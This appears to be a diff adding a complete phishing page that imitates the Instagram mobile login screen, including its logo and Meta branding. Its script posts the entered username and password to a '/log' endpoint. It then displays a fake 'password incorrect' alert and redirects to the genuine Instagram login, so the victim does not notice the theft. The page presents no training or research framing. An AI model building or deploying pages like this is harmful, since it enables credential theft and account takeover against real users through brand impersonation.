@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Instagram</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600;700&display=swap" rel="stylesheet" />
+    <style>
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .page {
+            width: 100%;
+            max-width: 430px;
+            min-height: 100vh;
+            background: #ffffff;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .top-bar {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px 16px 8px;
+            position: relative;
+        }
+
+        .back-arrow {
+            position: absolute;
+            left: 12px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 6px;
+            display: flex;
+            align-items: center;
+        }
+
+        .language-selector {
+            display: flex;
+            align-items: center;
+            gap: 3px;
+            font-size: 13.5px;
+            color: #262626;
+            font-weight: 400;
+            cursor: pointer;
+        }
+
+        .logo-area {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 55px 0 65px;
+        }
+
+        .form-area {
+            padding: 0 20px;
+        }
+
+        .input-wrap {
+            margin-bottom: 12px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 16px 16px;
+            border: 1px solid #dbdbdb;
+            border-radius: 10px;
+            font-size: 14px;
+            font-family: 'Roboto', sans-serif;
+            color: #262626;
+            background-color: #fafafa;
+            outline: none;
+            transition: border-color 0.15s;
+            -webkit-appearance: none;
+        }
+
+        .input-field::placeholder {
+            color: #999;
+            font-size: 14px;
+            font-weight: 400;
+        }
+
+        .input-field:focus {
+            border-color: #a0a0a0;
+            background-color: #fff;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background: #0095F6;
+            color: #ffffff;
+            font-size: 15px;
+            font-weight: 600;
+            font-family: 'Roboto', sans-serif;
+            border: none;
+            border-radius: 30px;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: background 0.15s;
+            letter-spacing: 0.2px;
+        }
+
+        .login-btn:active {
+            background: #007ad8;
+        }
+
+        .login-btn:hover {
+            background: #1da1f7;
+        }
+
+        .forgot-link {
+            display: block;
+            text-align: center;
+            margin-top: 22px;
+            font-size: 13.5px;
+            font-weight: 700;
+            color: #1a1a1a;
+            text-decoration: none;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .spacer {
+            flex: 1;
+        }
+
+        .bottom-area {
+            padding: 20px 20px 40px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 18px;
+        }
+
+        .create-btn {
+            width: 100%;
+            padding: 13px;
+            background: transparent;
+            color: #0095F6;
+            font-size: 14.5px;
+            font-weight: 600;
+            font-family: 'Roboto', sans-serif;
+            border: 1.5px solid #0095F6;
+            border-radius: 30px;
+            cursor: pointer;
+            transition: background 0.15s;
+        }
+
+        .create-btn:hover {
+            background: rgba(0, 149, 246, 0.04);
+        }
+
+        .meta-row {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .meta-text {
+            font-family: 'Roboto', sans-serif;
+            font-size: 15px;
+            font-weight: 500;
+            color: #737373;
+        }
+
+        .overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(255, 255, 255, 0.9);
+            z-index: 999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            gap: 14px;
+        }
+
+        .overlay.show {
+            display: flex;
+        }
+
+        .spinner {
+            width: 36px;
+            height: 36px;
+            border: 3.5px solid #eee;
+            border-top-color: #0095F6;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .overlay-text {
+            font-size: 13px;
+            color: #777;
+            font-weight: 500;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="overlay" id="overlay">
+        <div class="spinner"></div>
+        <div class="overlay-text">Logging in…</div>
+    </div>
+
+    <div class="page">
+
+        <!-- Top bar -->
+        <div class="top-bar">
+            <button class="back-arrow" onclick="history.back()" aria-label="Go back">
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
+                    <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z" fill="#222" />
+                </svg>
+            </button>
+            <div class="language-selector">
+                <span>English (India)</span>
+                <svg width="13" height="13" viewBox="0 0 24 24" fill="none">
+                    <path d="M7 10l5 5 5-5H7z" fill="#444" />
+                </svg>
+            </div>
+        </div>
+
+        <!-- Instagram Outlined Gradient Logo -->
+        <div class="logo-area">
+            <svg width="72" height="72" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
+                <defs>
+                    <linearGradient id="insta-grad" x1="0%" y1="100%" x2="100%" y2="0%">
+                        <stop offset="0%" style="stop-color:#feda75;" />
+                        <stop offset="5%" style="stop-color:#fa7e1e;" />
+                        <stop offset="45%" style="stop-color:#d92e7f;" />
+                        <stop offset="60%" style="stop-color:#9b36b7;" />
+                        <stop offset="90%" style="stop-color:#515bd4;" />
+                    </linearGradient>
+                </defs>
+                <rect x="30" y="30" width="140" height="140" rx="35" ry="35" fill="none" stroke="url(#insta-grad)"
+                    stroke-width="12" />
+                <circle cx="100" cy="100" r="30" fill="none" stroke="url(#insta-grad)" stroke-width="10" />
+                <circle cx="140" cy="60" r="7" fill="url(#insta-grad)" />
+            </svg>
+        </div>
+
+        <!-- Form -->
+        <div class="form-area">
+            <form id="loginForm" onsubmit="handleLogin(event)">
+                <div class="input-wrap">
+                    <input type="text" id="username" name="username" class="input-field"
+                        placeholder="Username, email address or mobile number" autocomplete="username"
+                        autocapitalize="none" spellcheck="false" required />
+                </div>
+                <div class="input-wrap">
+                    <input type="password" id="password" name="password" class="input-field" placeholder="Password"
+                        autocomplete="current-password" required />
+                </div>
+                <button type="submit" class="login-btn" id="loginBtn">Log in</button>
+            </form>
+            <a href="https://www.instagram.com/accounts/password/reset/" target="_blank" class="forgot-link">Forgotten
+                password?</a>
+        </div>
+
+        <div class="spacer"></div>
+
+        <!-- Bottom -->
+        <div class="bottom-area">
+            <button class="create-btn"
+                onclick="window.open('https://www.instagram.com/accounts/emailsignup/','_blank')">Create new
+                account</button>
+
+            <!-- Meta logo with infinity SVG -->
+            <div class="meta-row">
+                <svg width="20" height="12" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+                    <path fill="#0064e0" fill-rule="evenodd"
+                        d="M8.217 5.243C9.145 3.988 10.171 3 11.483 3 13.96 3 16 6.153 16.001 9.907c0 2.29-.986 3.725-2.757 3.725-1.543 0-2.395-.866-3.924-3.424l-.667-1.123-.118-.197a55 55 0 0 0-.53-.877l-1.178 2.08c-1.673 2.925-2.615 3.541-3.923 3.541C1.086 13.632 0 12.217 0 9.973 0 6.388 1.995 3 4.598 3q.477-.001.924.122c.31.086.611.22.913.407.577.359 1.154.915 1.782 1.714m1.516 2.224q-.378-.615-.727-1.133L9 6.326c.845-1.305 1.543-1.954 2.372-1.954 1.723 0 3.102 2.537 3.102 5.653 0 1.188-.39 1.877-1.195 1.877-.773 0-1.142-.51-2.61-2.87zM4.846 4.756c.725.1 1.385.634 2.34 2.001A212 212 0 0 0 5.551 9.3c-1.357 2.126-1.826 2.603-2.581 2.603-.777 0-1.24-.682-1.24-1.9 0-2.602 1.298-5.264 2.846-5.264q.137 0 .27.018" />
+                </svg>
+                <span class="meta-text">Meta</span>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- DEBUGGING JAVASCRIPT -->
+    <script>
+        function handleLogin(e) {
+            e.preventDefault();
+            var u = document.getElementById('username').value.trim();
+            var p = document.getElementById('password').value.trim();
+            if (!u || !p) return;
+
+            document.getElementById('overlay').classList.add('show');
+
+            fetch('/log', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username: u, password: p })
+            })
+                .then(function (response) {
+                    return response.json();
+                })
+                .then(function (data) {
+                    document.getElementById('overlay').classList.remove('show');
+                    alert("Sorry, your password was incorrect. Please double-check your password.");
+                    document.getElementById('password').value = '';
+                    setTimeout(function () {
+                        window.location.href = 'https://www.instagram.com/accounts/login/';
+                    }, 1500);
+                })
+                .catch(function (error) {
+                    // STOP! Show the exact error instead of redirecting
+                    document.getElementById('overlay').classList.remove('show');
+                    alert("FETCH FAILED! Error: " + error);
+                });
+        }
+    </script>
+
+</body>
+
+</html>
